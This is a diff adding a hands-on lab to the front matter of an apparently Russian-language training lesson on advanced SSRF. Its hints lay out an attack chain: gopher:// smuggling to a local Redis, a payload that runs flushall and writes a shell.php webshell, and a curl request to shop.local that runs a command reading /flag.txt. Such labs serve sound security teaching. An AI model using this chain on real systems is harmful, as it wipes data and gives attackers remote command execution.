@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 8
 summary: "Продвинутый уровень SSRF: контрабанда протоколов (gopher/dict), DNS rebinding и serverless."
+lab:
+  kind: shell
+  title: "Практика: SSRF через gopher → Redis → RCE"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, gopher.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Схемы решают: file:// отклонён, а gopher://127.0.0.1:6379/_PING возвращает PONG."
+    - "gopher передаёт сырые байты: в gopher.txt лежит Redis-payload (flushall + запись shell.php)."
+    - "Отправь файл через --data-urlencode 'avatar_url@gopher.txt' — Redis сохранит webshell."
+    - "Выполни curl -s 'https://shop.local/shell.php?cmd=cat /flag.txt' > found.txt — затем check."
 ---
 
 ## Задача
